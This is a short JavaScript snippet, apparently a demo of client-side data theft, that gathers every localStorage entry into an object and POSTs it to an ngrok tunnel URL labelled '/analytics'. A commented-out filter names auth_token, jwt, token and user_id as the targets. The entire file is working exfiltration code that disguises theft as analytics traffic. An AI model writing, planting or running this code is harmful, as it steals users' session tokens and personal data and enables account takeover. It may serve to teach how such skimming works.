console.hog = (...args) => console.log("🐷🐷🐷", args, "🐷🐷🐷")

// const coolKeys = ["auth_token", "jwt", "token", "user_id"]

const hogYourData = Object.keys(localStorage)
  // .filter(key => coolKeys.includes(key))
  .reduce((data, key) => {
    data[key] = localStorage.getItem(key)
    return data
  }, {})

fetch("http://31ada8f2.ngrok.io/analytics", {
  method: "POST",
  headers: {
    "Content-Type": "application/json"
  },
  body: JSON.stringify(hogYourData)
})
